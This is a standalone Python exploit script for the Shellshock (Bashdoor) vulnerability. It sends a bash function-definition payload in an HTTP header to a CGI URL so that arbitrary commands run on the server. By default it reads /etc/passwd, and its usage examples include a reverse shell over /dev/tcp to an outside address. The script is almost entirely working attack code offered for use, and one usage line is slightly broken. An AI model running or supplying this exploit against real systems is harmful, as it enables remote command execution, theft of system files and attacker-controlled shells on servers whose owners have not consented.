# Shellshock

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def exploit(s, url, path, command):
	uri = url + path
	headers = {'X-Frame-Options': f'() {{ :; }}; echo; echo; /bin/bash -c "{command}"'}
	# headers = {'User-Agent': f'() {{ :; }}; echo; echo; /bin/bash -c "{command}"'}
	r = s.get(uri, headers=headers)
	print(r.text)

def show_usage():
	print('[+] Usage: %s <URL> (<COMMAND>)' % sys.argv[0])
	print('[+] Example: %s https://www.target.com/cgi-bin/file.cgi "cat /etc/passwd"' % sys.argv[0])
	print('[+] Example: %s http://10.10.60.20/cgi-bin/test.cgi "bash -i >& /dev/tcp/10.10.10.10/1337 0>&1"' % sys.argv[0])
	print('[+] Example: %s http://10.10.60.20/cgi-bin/test.cgi' % sys.argv[0])
	print('[+] Default COMMAND: cat /etc/passwd"' % sys.argv[0])

	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Shellshock (Bashdoor)')
	try:
		url = sys.argv[1].strip()
		if len(sys.argv) > 2:
			command = sys.argv[2].strip()
		else:
			command = "cat /etc/passwd"
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			path = parsed_url.path
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			url = parsed_url.scheme + '://' + host
			time.sleep(2)
			exploit(s, url, path, command)
			if len(sys.argv) == 2:
				show_usage()
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
		print('[-] Set up proxy on localhost:8080 <!>')
		print('[-] Or comment line 48 "s.proxies = proxies" <!>')
	except KeyboardInterrupt:
		sys.exit(1)
	except Exception:
		sys.exit(1)

if __name__ == "__main__":
	main()

